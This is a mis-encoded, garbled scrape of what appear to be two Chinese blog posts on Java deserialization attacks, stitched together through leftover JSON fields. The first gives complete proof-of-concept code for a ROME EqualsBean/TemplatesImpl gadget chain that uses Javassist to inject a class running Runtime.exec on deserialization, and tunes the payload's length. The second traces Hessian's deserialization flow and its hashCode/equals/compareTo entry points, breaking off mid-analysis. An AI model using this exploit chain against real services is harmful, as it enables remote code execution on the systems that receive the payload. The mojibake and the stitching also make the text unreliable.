ç²¾ç®€payloadåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç½‘ç«™å¯èƒ½ä¼šå¯¹ååºåˆ—åŒ–æ•°æ®çš„é•¿åº¦æœ‰ä¸€å®šé™åˆ¶ï¼Œæ‰€ä»¥æœ‰å¿…è¦é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥ç¼©çŸ­Payloadã€‚ å„Gadgeté•¿åº¦æ¯”è¾ƒä¸ºäº†æ–¹ä¾¿æ¯”è¾ƒï¼Œè¿™é‡Œçš„é•¿åº¦æŒ‡Payloadç»base64ä¹‹åçš„é•¿åº¦ Gadget é•¿åº¦ BadAttributeValueExpExceptionåˆ©ç”¨é“¾ 3620 ObjectBeanåˆ©ç”¨é“¾ 3428 HashTableåˆ©ç”¨é“¾ 3484 EqualsBeanåˆ©ç”¨é“¾ 2920 è¿™é‡Œæœ€çŸ­çš„æ˜¯EqualsBeanåˆ©ç”¨é“¾ï¼Œé‚£ä¹ˆä¸‹é¢æˆ‘å°±ä»¥è¯¥åˆ©ç”¨é“¾ä¸ºä¾‹ï¼Œç»§ç»­ç¼©çŸ­æˆ‘ä»¬Payloadçš„é•¿åº¦ã€‚ ä½¿ç”¨Javassistç¼©çŸ­æ¶æ„classä»€ä¹ˆæ˜¯JavassistJava å­—èŠ‚ç ä»¥äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨åœ¨ .class æ–‡ä»¶ä¸­ï¼Œæ¯ä¸€ä¸ª.classæ–‡ä»¶åŒ…å«ä¸€ä¸ªJavaç±»æˆ–æ¥å£ã€‚Javaassist å°±æ˜¯ä¸€ä¸ªç”¨æ¥å¤„ç†Javaå­—èŠ‚ç çš„ç±»åº“ã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªå·²ç»ç¼–è¯‘å¥½çš„ç±»ä¸­æ·»åŠ æ–°çš„æ–¹æ³•ï¼Œæˆ–è€…æ˜¯ä¿®æ”¹å·²æœ‰çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯¹å­—èŠ‚ç æ–¹é¢æœ‰æ·±å…¥çš„äº†è§£ã€‚åŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡æ‰‹åŠ¨çš„æ–¹å¼å»ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ã€‚å…¶ä½¿ç”¨æ–¹å¼ç±»ä¼¼äºåå°„ã€‚ ClassPoolClassPoolæ˜¯CtClasså¯¹è±¡çš„å®¹å™¨ã€‚CtClasså¯¹è±¡å¿…é¡»ä»è¯¥å¯¹è±¡è·å¾—ã€‚å¦‚æœget()åœ¨æ­¤å¯¹è±¡ä¸Šè°ƒç”¨ï¼Œåˆ™å®ƒå°†æœç´¢è¡¨ç¤ºçš„å„ç§æºClassPath ä»¥æŸ¥æ‰¾ç±»æ–‡ä»¶ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªCtClassè¡¨ç¤ºè¯¥ç±»æ–‡ä»¶çš„å¯¹è±¡ã€‚åˆ›å»ºçš„å¯¹è±¡å°†è¿”å›ç»™è°ƒç”¨è€…ã€‚å¯ä»¥å°†å…¶ç†è§£ä¸ºä¸€ä¸ªå­˜æ”¾CtClasså¯¹è±¡çš„å®¹å™¨ã€‚ è·å¾—æ–¹æ³•ï¼š ClassPool cp = ClassPool.getDefault();ã€‚é€šè¿‡ ClassPool.getDefault() è·å–çš„ ClassPool ä½¿ç”¨ JVM çš„ç±»æœç´¢è·¯å¾„ã€‚å¦‚æœç¨‹åºè¿è¡Œåœ¨ JBoss æˆ–è€… Tomcat ç­‰ Web æœåŠ¡å™¨ä¸Šï¼ŒClassPool å¯èƒ½æ— æ³•æ‰¾åˆ°ç”¨æˆ·çš„ç±»ï¼Œå› ä¸ºWebæœåŠ¡å™¨ä½¿ç”¨å¤šä¸ªç±»åŠ è½½å™¨ä½œä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒClassPool å¿…é¡»æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„ã€‚ cp.insertClassPath(new ClassClassPath(Class)); CtClasså¯ä»¥å°†å…¶ç†è§£æˆåŠ å¼ºç‰ˆçš„Classå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡CtClasså¯¹ç›®æ ‡ç±»è¿›è¡Œå„ç§æ“ä½œã€‚å¯ä»¥ClassPool.get(ClassName)ä¸­è·å–ã€‚ CtMethodåŒç†ï¼Œå¯ä»¥ç†è§£æˆåŠ å¼ºç‰ˆçš„Methodå¯¹è±¡ã€‚å¯é€šè¿‡CtClass.getDeclaredMethod(MethodName)è·å–ï¼Œè¯¥ç±»æä¾›äº†ä¸€äº›æ–¹æ³•ä»¥ä¾¿æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥ä¿®æ”¹æ–¹æ³•ä½“ public final class CtMethod extends CtBehavior // ä¸»è¦çš„å†…å®¹éƒ½åœ¨çˆ¶ç±» CtBehavior ä¸­ // çˆ¶ç±» CtBehaviorpublic abstract class CtBehavior extends CtMember // è®¾ç½®æ–¹æ³•ä½“ public void setBody(String src); // æ’å…¥åœ¨æ–¹æ³•ä½“æœ€å‰é¢ public void insertBefore(String src); // æ’å…¥åœ¨æ–¹æ³•ä½“æœ€åé¢ public void insertAfter(String src); // åœ¨æ–¹æ³•ä½“çš„æŸä¸€è¡Œæ’å…¥å†…å®¹ public int insertAt(int lineNum, String src); ä¼ é€’ç»™æ–¹æ³• insertBefore() ï¼ŒinsertAfter() å’Œ insertAt() çš„ String å¯¹è±¡æ˜¯ç”±Javassist çš„ç¼–è¯‘å™¨ç¼–è¯‘çš„ã€‚ ç”±äºç¼–è¯‘å™¨æ”¯æŒè¯­è¨€æ‰©å±•ï¼Œä»¥ $ å¼€å¤´çš„å‡ ä¸ªæ ‡è¯†ç¬¦æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼š ç¬¦å· å«ä¹‰ $0,$1, $2, â€¦ $0 this; $1 args[1] â€¦.. $args æ–¹æ³•å‚æ•°æ•°ç»„.å®ƒçš„ç±»å‹ä¸º Object[] $$ æ‰€æœ‰å®å‚ã€‚ä¾‹å¦‚, m($$) ç­‰ä»·äº m(1,2,â€¦) $cflow(â€¦) cflow å˜é‡ $r è¿”å›ç»“æœçš„ç±»å‹ï¼Œç”¨äºå¼ºåˆ¶ç±»å‹è½¬æ¢ $w åŒ…è£…å™¨ç±»å‹ï¼Œç”¨äºå¼ºåˆ¶ç±»å‹è½¬æ¢ $_ è¿”å›å€¼ $sig ç±»å‹ä¸º java.lang.Class çš„å‚æ•°ç±»å‹æ•°ç»„ $type ä¸€ä¸ª java.lang.Class å¯¹è±¡ï¼Œè¡¨ç¤ºè¿”å›å€¼ç±»å‹ $class ä¸€ä¸ª java.lang.Class å¯¹è±¡ï¼Œè¡¨ç¤ºå½“å‰æ­£åœ¨ä¿®æ”¹çš„ç±» javassistä¾èµ–dependency groupIdorg.javassist/groupId artifactIdjavassist/artifactId version3.25.0-GA/version/dependency ç²¾ç®€gadgetå…¶å®åœ¨Gedgatçš„è°ƒç”¨æµç¨‹ä¸­ï¼Œä»æœ‰ä¸€äº›ç»†èŠ‚å¯ä»¥ä¼˜åŒ–ï¼Œæ¯”å¦‚ TemplatesImpl._nameçš„é•¿åº¦å¯ä»¥ä¸º1 TemplatesImpl._tfactoryå¯ä»¥ä¸ç”¨èµ‹å€¼ HashMapçš„valueé•¿åº¦å¯ä»¥ä¸º1 æœ€ç»ˆPocå¦‚ä¸‹ package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception TemplatesImpl templatesimpl = new TemplatesImpl(); byte[] bytecodes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); setField(templatesimpl,_name,a); setField(templatesimpl,_bytecodes,new byte[][] bytecodes);// setField(templatesimpl, _tfactory, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMapObject ,Object hashMap = new HashMap(); hashMap.put(1,1); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,equalsBean); byte[] bytes = ser(hashMap); unser(bytes); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); Payloadæœ€çŸ­é•¿åº¦ä¸ºEqualsBeanåˆ©ç”¨é“¾çš„1340å­—ç¬¦ã€‚å…¶å®åœ¨ååºåˆ—åŒ–æ•°æ®ä¸­è¿˜æœ‰ä¸€äº›æ— ç”¨å­—ç¬¦ï¼Œå»æ‰è¿™äº›æ— ç”¨å­—ç¬¦ä¹Ÿä¸ä¼šå½±å“ååºåˆ—åŒ–æµç¨‹ï¼Œæ‰€ä»¥Payloadç†è®ºä¸Šè¿˜èƒ½æ›´çŸ­ ä¸‹é¢ä¸€ä¸ªæ˜¯æœ‰åˆ©ç”¨åˆ°javassistæ¥ç”Ÿæˆpayloadçš„pocï¼š package org.example;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import sun.reflect.ReflectionFactory;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception HashMapObject,Object hashMap = new HashMap(); ToStringBean toStringBean = createObjWithoutConstructor(ToStringBean.class); setField(toStringBean,_obj,getTemplates()); setField(toStringBean,_beanClass, Templates.class); EqualsBean equalsBean = createObjWithoutConstructor(EqualsBean.class); setField(equalsBean,_obj,toStringBean); hashMap.put(1,1); setHashMapKey(hashMap,1,equalsBean); unser(ser(hashMap)); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); public static void setHashMapKey(HashMap hashMap,Object oldKey,Object newKey) throws Exception Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) // System.out.println(entry); if (entry!= null) Field keyField = entry.getClass().getDeclaredField(key); keyField.setAccessible(true); Object keyValue = keyField.get(entry); if (keyValue.equals(oldKey)) setField(entry,key,newKey); public static byte[] getEvilBytes(String cmd) throws Exception ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(evil); String code = java.lang.Runtime.getRuntime().exec(\\+cmd+\\);; ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); CtConstructor constructor = ctClass.makeClassInitializer(); constructor.insertBefore(code);// ctClass.writeFile(); return ctClass.toBytecode(); public static Templates getTemplates() throws Exception byte[][] bytes = new byte[][]getEvilBytes(calc); TemplatesImpl templates = new TemplatesImpl(); Class? templatesClass = templates.getClass(); Field _bytecodesField = templatesClass.getDeclaredField(_bytecodes); _bytecodesField.setAccessible(true); _bytecodesField.set(templates,bytes); Field _nameField = templatesClass.getDeclaredField(_name); _nameField.setAccessible(true); _nameField.set(templates,666); Field _transletIndexField = templatesClass.getDeclaredField(_transletIndex); _transletIndexField.setAccessible(true); _transletIndexField.set(templates,0); Field _tfactoryField = templatesClass.getDeclaredField(_tfactory); _tfactoryField.setAccessible(true); _tfactoryField.set(templates,new TransformerFactoryImpl()); return templates; public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static T T createObjWithConstructor (ClassT clazz,Class? super T superClazz,Class?[] argsTypes,Object[] argsValues) throws Exception Constructor?super T constructor = superClazz.getDeclaredConstructor(argsTypes); constructor.setAccessible(true); Constructor? constructor1 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return (T) constructor1.newInstance(argsValues); public static T T createObjWithoutConstructor(ClassT clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return (T) constructor1.newInstance();","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹Hessian","path":"/2025/03/19/javaååºåˆ—åŒ–ä¹‹Hessian/","content":"å¼•ç”¨Javaååºåˆ—åŒ–ä¹‹Hessian Javaå®‰å…¨ä¹‹Hessianååºåˆ—åŒ– Hessianåè®®Hessianæ˜¯ä¸€ä¸ªåŸºäºRPCçš„é«˜æ€§èƒ½äºŒè¿›åˆ¶è¿œç¨‹ä¼ è¾“åè®®ï¼Œå®˜æ–¹å¯¹Javaã€FlashFlexã€Pythonã€C++ã€.NET C#ç­‰å¤šç§è¯­è¨€éƒ½è¿›è¡Œäº†å®ç°ï¼Œå¹¶ä¸”Hessianä¸€èˆ¬é€šè¿‡Web Serviceæä¾›æœåŠ¡ã€‚åœ¨Javaä¸­ï¼ŒHessiançš„ä½¿ç”¨æ–¹æ³•éå¸¸ç®€å•ï¼Œå®ƒä½¿ç”¨Javaè¯­è¨€æ¥å£å®šä¹‰äº†è¿œç¨‹å¯¹è±¡ï¼Œå¹¶é€šè¿‡åºåˆ—åŒ–å’Œååºåˆ—åŒ–å°†å¯¹è±¡è½¬ä¸ºHessianäºŒè¿›åˆ¶æ ¼å¼è¿›è¡Œä¼ è¾“ å¯¹äº Hessian2 åè®®ï¼ŒJava çš„HashMapå¯¹è±¡ç»è¿‡åºåˆ—åŒ–åé¦–ä½å­—èŠ‚ç”±Må˜ä¸ºäº†Hï¼Œå¯¹åº” ascii ç  72ï¼Œå…¶ä»–çš„åŒºåˆ«ä¸å¤§ é¡¹ç›®ä¸­åŠ å…¥ä¾èµ– dependency groupIdcom.caucho/groupId artifactIdhessian/artifactId version4.0.63/version/dependency åŸºç¡€ä½¿ç”¨åºåˆ—åŒ–public static String ser(Object object) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream); // hessian2Output.getSerializerFactory().setAllowNonSerializable(true); hessian2Output.writeObject(object); hessian2Output.flushBuffer(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); ååºåˆ—åŒ–public static Object unser(String string) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream); return hessian2Input.readObject(); å¯»æ‰¾ä¹‹æ—…æ™®é€šååºåˆ—åŒ–æµç¨‹åˆ›å»ºä¸€ä¸ªæ™®é€šç±» package org.example;public class Person //Personç±»æœªå®ç°Serializableæ¥å£ public String name; public transient int age;\t//ageç”¨transientä¿®é¥° private float weight; public Person(String name,int age,float weight) this.name = name; this.age = age; this.weight = weight; public String getName() return name; public int getAge() return age; public float getWeight() return weight; @Override public String toString() return Person + name= + name + \\ + , age= + age + , weight= + weight + ; æµ‹è¯• String s = ser(new Person(sherlock,21,67));Person person = (Person) unser(s);System.out.println(person); è¿è¡Œä¹‹åæŠ¥é”™å¦‚ä¸‹ ä»æŠ¥é”™ä¿¡æ¯å¾ˆæ¸…æ¥šåœ°å°±å¯ä»¥çœ‹å‡ºæ¥é—®é¢˜å‡ºåœ¨Personç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œè‡ªå·±æ‰“æ–­ç‚¹è·Ÿè¸ªå¯ä»¥å‘ç°åŸå› æ˜¯åœ¨äºHessianåœ¨åºåˆ—åŒ–æ•°æ®çš„æ—¶å€™è¿˜æ˜¯ä¼šæ£€æŸ¥æ˜¯å¦å®ç°Serializableæ¥å£ ä½†æ˜¯åœ¨Hessianä¸­ï¼Œåºåˆ—åŒ–çš„è¿™ä¸ªè§„åˆ™å¾ˆå®¹æ˜“è¢«æ‰“ç ´ï¼Œåœ¨ä¸Šå›¾ä»£ç ä¸­å­˜åœ¨ä¸€ä¸ªå˜é‡_isAllowNonSerializableï¼Œåœ¨hessianä¸­å¯ä»¥ç”±ä¸‹é¢çš„è¯­å¥è®¾ç½®ä¸ºtrue hessian2Output.getSerializerFactory().setAllowNonSerializable(true); æ”¹å®Œä¹‹åæˆ‘ä»¬å†æ¬¡è¿è¡Œï¼Œè¿”å›ç»“æœå¦‚ä¸‹ å¯ä»¥çœ‹åˆ°è¢«transientä¿®é¥°çš„å­—æ®µä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–çš„æ—¶å€™è¿”å›é»˜è®¤å€¼ ä¹Ÿå°±æ˜¯è¯´Hessiançš„ååºåˆ—åŒ–ç†è®ºä¸Šæ”¯æŒååºåˆ—åŒ–ä»»ä½•å¯¹è±¡ okï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹è·Ÿè¿›ååºåˆ—åŒ–æµç¨‹ æˆ‘ä»¬è·Ÿè¿›readObjectæ–¹æ³•ï¼Œè¿™é‡Œçš„bufferæ˜¯å¾…ååºåˆ—åŒ–å­—èŠ‚æµï¼Œç„¶åå–æ ‡è¯†ä½ï¼Œç”¨äºåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹çš„å¯¹è±¡ è¿™é‡Œæˆ‘ä»¬æ˜¯è‡ªå®šä¹‰çš„ç±»ï¼Œæ‰€ä»¥èµ°åˆ°äº†case â€˜Câ€™ è·Ÿè¿›readObjectDefinitionï¼Œé€šè¿‡readString()æ–¹æ³•è·å–åˆ°ç±»åï¼ŒreadInt()æ–¹æ³•è·å–åˆ°æœªè¢«transientä¿®é¥°çš„å­—æ®µæ•°ï¼ŒfindSerializerFactory()æ–¹æ³•è·å–åˆ°é»˜è®¤çš„å·¥å‚ç±»SerializerFactory æ¥ä¸‹æ¥æ˜¯é€šè¿‡å·¥å‚ç±»æ¥è·å–ååºåˆ—åŒ–å™¨ï¼Œæˆ‘ä»¬è·Ÿè¿›å» ä¸€è·¯æ­¥å…¥åˆ°å¦‚ä¸‹æ‰€ç¤º å¾€ä¸‹èµ°ï¼Œä¼šä»ä¸€ä¸ªè¡¨_staticTypeMapä¸­è·å–åŸºç¡€ç±»å‹çš„ååºåˆ—åŒ–å™¨ï¼Œæˆ‘ä»¬è¿™æ˜¯è‡ªå®šä¹‰çš„ç±»ï¼Œæ‰€ä»¥è‡ªç„¶æ˜¯æ²¡æœ‰çš„ ç»§ç»­å¾€ä¸‹èµ°è¯¥å¤„ï¼Œè·Ÿè¿›å» è·Ÿè¿›loadæ–¹æ³• è¯¶ï¼Œè¿™ä¼¼ä¹æ˜¯å¯¹ååºåˆ—åŒ–çš„ç±»è¿›è¡Œä¸€å®šçš„åˆ¤æ–­ï¼Œè·Ÿè¿›isAllowæ–¹æ³• ç™½åå•ä¸ºç©ºï¼Œæ‰€ä»¥æ ¸éªŒç±»æ˜¯å¦åœ¨é»‘åå•ä¸­ éƒ½æ²¡æœ‰ï¼Œæœ€åè¿”å›trueï¼Œè¿›å…¥ifå†…å®¹ä¸­è¿›è¡Œä¸€ä¸ªç±»åŠ è½½ï¼Œè¿”å› è·Ÿè¿›getDeserializeræ–¹æ³• å†è·Ÿè¿›loadDeserializeræ–¹æ³•ï¼Œä¸€ç›´å¾€ä¸‹èµ°ï¼Œè·Ÿè¿›getDefaultDeserializeræ–¹æ³• æˆ‘ä»¬å¯ä»¥å‘ç°æœ€åè·å–çš„ååºåˆ—åŒ–å™¨æ˜¯UnsafeDeserializer è·Ÿè¿›å»çœ‹çœ‹ï¼Œå¯ä»¥å‘ç°åœ¨UnsafeDeserializerç±»çš„é™æ€ä»£ç å—ä¸­è¿›è¡Œäº†unsafeå¯¹è±¡çš„åŠ è½½ å›åˆ°å®ƒçš„æ„é€ å‡½æ•°ä¸­ï¼Œæœ‰ä¸€ä¸ªgetFieldMapæ–¹æ³•å¯¹ç±»è¿›è¡Œä¸€ä¸ªå¯¹åº”fieldçš„è·å– è·Ÿè¿›å»ç®€å•çœ‹ä¸€ä¸‹ï¼Œçœ‹åˆ°äº†å¯¹transientå’Œstaticå±æ€§çš„å¤„ç†ï¼Œç›´æ¥è·³è¿‡ä¸å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå‰é¢è§‚å¯Ÿåˆ°ageå±æ€§æ— æ³•è¢«ååºåˆ—åŒ– è·å–åˆ°çš„fieldä¼šè¢«å­˜å…¥ä¸€ä¸ªhashmapé‡Œ å…¨éƒ¨è·å–å®Œè¿”å›åä¸‹ä¸€è¡Œä»£ç å°±æ˜¯å¯¹readResolveæ–¹æ³•è¿›è¡Œä¸€ä¸ªå¤„ç†ï¼Œè·ŸåŸç”Ÿååºåˆ—åŒ–ä¸€æ ·ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹ è¯¥å‡½æ•°é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯éå†æ‰€æœ‰çš„æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨readResolveæ–¹æ³•å°±æ–¹æ³•å®ƒï¼Œä¸å­˜åœ¨å°±è¿”å›null æˆ‘ä»¬å¹¶æ²¡æœ‰é‡å†™readResolveæ–¹æ³•ï¼Œè¿”å›nullï¼Œä¸€è·¯è¿”å›ï¼Œæœ€åæ˜¯è·å–åˆ°çš„ååºåˆ—åŒ–å™¨ä¾¿æ˜¯UnsafeDeseializer ç»§ç»­è¿”å›ï¼Œè¿˜ä¼šå°†è·å–åˆ°çš„ååºåˆ—åŒ–å™¨putè¿›_cachedDeserializerMapè¡¨ä¸­ ç„¶åç»§ç»­è¿”å›ï¼Œè¿˜ä¼šputè¿›_cachedTypeDeserializerMapä¸­ æœ€åè¿”å›åˆ°readObjectDefinitionæ–¹æ³•ï¼Œreaderä¾¿è¢«èµ‹ä¸ºäº†UnsafeDeseializer å¾€ä¸‹èµ°ï¼Œä¼šé€šè¿‡readString()æ–¹æ³•æ¥è·å–fieldçš„åå­—ï¼Œç„¶åä¸¢è¿›fieldså’ŒfieldNamesæ•°ç»„ä¸­ ç»§ç»­å¾€ä¸‹ï¼Œè¿™é‡Œä¾¿æ˜¯å¯¹å‰é¢é‡è¦å†…å®¹è¿›è¡Œä¸€ä¸ªå°è£…ï¼Œç„¶åaddåˆ°_classDefsç±»å®šä¹‰ä¸­ ç„¶åæˆ‘ä»¬å°±æ­¥å‡ºäº†readObjectDefinitionæ–¹æ³•ï¼Œæ–¹æ³•å¦‚å…¶åå°±æ˜¯è·å–ç±»çš„å„ç§å±æ€§ã€ååºåˆ—åŒ–å™¨ç­‰å¹¶å°†å…¶è¿›è¡Œå°è£…æˆ–put æ¥ç€æˆ‘ä»¬è·Ÿè¿›readObjectæ–¹æ³• èµ°åˆ°è¿™éƒ¨åˆ†ï¼Œä¼šä»_classDefsä¸­è·å–åˆ°æˆ‘ä»¬å°è£…çš„é‡è¦å†…å®¹ï¼Œå†è·Ÿè¿›readObjectInstanceæ–¹æ³• ä¸Šé¢éƒ¨åˆ†å°±æ˜¯ä¼šè·å–ç±»çš„å„ç§å±æ€§ã€ååºåˆ—åŒ–å™¨ç­‰ç­‰ï¼Œç„¶åæˆ‘ä»¬è·Ÿè¿›readObjectå‡½æ•°ä¸­ï¼ˆå¯ä»¥çœ‹åˆ°æ—¶é€šè¿‡unsafeDeserializerè¿›è¡Œçš„ååºåˆ—åŒ–ï¼‰ é€šè¿‡instantiate()æ–¹æ³•ä¼šè·å–åˆ°ä¸€ä¸ªç©ºçš„Personå¯¹è±¡ï¼Œç„¶åå†è·Ÿè¿›readObjectæ–¹æ³• è¿™ä¸¤æ­¥ç»“æŸåï¼Œå°±å®Œæˆäº†å¯¹å¯¹è±¡çš„èµ‹å€¼ï¼Œååºåˆ—åŒ–è¿›ç¨‹ç»“æŸ æ¼æ´ç‚¹ä¸Šé¢çš„æµç¨‹è·Ÿå®Œäº†ä¹‹åï¼Œæ„Ÿè§‰å¹¶æ²¡æœ‰åƒfastjson,jacskoné‚£æ ·åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æœ‰è°ƒç”¨åˆ°ä»»ä½•çš„getterå’Œsetterï¼Œå…¨éƒ¨éƒ½æ˜¯ç”¨è¿‡unsafeè¿›è¡Œçš„æ“ä½œ é‚£æ¼æ´ç‚¹åœ¨å“ªé‡Œå‘¢ï¼Ÿ ç­”æ¡ˆå°±åœ¨äºHessianå¯¹äºMapçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œä¼šå°†ååºåˆ—åŒ–è¿‡åçš„é”®å€¼å¯¹putè¿›mapä¸­ hashCode()åˆ›å»ºä¸€ä¸ªHashMapå¯¹è±¡å¹¶è¿›è¡Œè°ƒè¯• è·Ÿè¿›readObjectåï¼Œä¼šèµ°åˆ°case â€˜Hâ€™å¤„ è·Ÿè¿›readMapæ–¹æ³• æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“typeä¸ºnullï¼Œè·å–ä¸åˆ°ååºåˆ—åŒ–å™¨æ—¶ï¼Œä¼šæ–°ç”Ÿæˆä¸€ä¸ª_typeå€¼ä¸ºHashMapçš„MapDeserializerå¯¹è±¡ è·Ÿè¿›å®ƒçš„readMapæ–¹æ³• å¦‚æœ_typeä¸ºnullåˆ™ä¼šè‡ªåŠ¨ç»™mapèµ‹ä¸ºHashMapï¼›å¦‚æœå®ƒæ˜¯Mapç±»ï¼Œåˆ™ä¹Ÿä¼šè¢«å½“ä½œHashMapï¼›å¦‚æœå®ƒæ˜¯StoredMapç±»ï¼Œåˆ™æ˜¯è¢«å½“ä½œTreeMapè¿›è¡Œååºåˆ—åŒ– _typeä¸ä¸ºä»¥ä¸Šä¸‰ç§åˆ™ç›´æ¥ç”Ÿæˆå¯¹è±¡ ç„¶åå¼€å§‹å°†é”®å€¼å¯¹åˆ†åˆ«ååºåˆ—åŒ–åå­˜å…¥mapä¸­ ç†Ÿæ‚‰çš„putæ–¹æ³•ï¼Œä¹‹å‰æˆ‘ä»¬éƒ½æœ‰è·Ÿè¿‡åœ¨HashMapè°ƒç”¨putæ–¹æ³•çš„æ—¶å€™ï¼Œä¸ºäº†æ£€æµ‹keyå€¼çš„å”¯ä¸€æ€§ï¼Œä¼šå…ˆè°ƒç”¨hash(key)ï¼Œè¿›è€Œè°ƒç”¨key.hashCode() æ‰€ä»¥å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨HashMapçš„keyå¤„åšæ–‡ç« ï¼Œå°†hashCodeæ–¹æ³•ä½œä¸ºå…¥å£ç‚¹ equals()åœ¨putValæ–¹æ³•é‡Œé¢ï¼Œè¿˜ä¼šè°ƒç”¨keyçš„equalsæ–¹æ³• compareTo()compare()å¯¹äºTreeMapï¼Œä¸ºäº†æ£€éªŒkeyå€¼ æ”¹ä¸€ä¸ªè‡ªå®šä¹‰çš„Comparable TreeMapObject,Object treeMap = new TreeMap();treeMap.put(new Comparable() @Override public int compareTo(Object o) return 0; , null);String treeMapStr = ser(treeMap);unser(treeMapStr); è¿›è¡Œè°ƒè¯•ï¼Œè·Ÿè¿›readObjectï¼Œèµ°åˆ°case â€˜Mâ€™ å…ˆæ˜¯é€šè¿‡readType()è·å–åˆ°typeå€¼ï¼Œç„¶åå†è°ƒç”¨readMapæ–¹æ³• è·Ÿè¿›å»ï¼Œç„¶åèµ°åˆ°MapDeserializerçš„readMap()å¤„ ç»§ç»­è·Ÿè¿›å» è·Ÿæˆ‘ä»¬ç¬¬ä¸€ä¸ªåˆ†æçš„HashMapå¤§å·®ä¸å·®ï¼Œå·®åˆ«æ¯”è¾ƒå¤§çš„å°±æ˜¯TreeMapçš„putæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬è·Ÿè¿›å» è·Ÿè¿›ç¬¬ä¸€ä¸ªcompareæ–¹æ³• 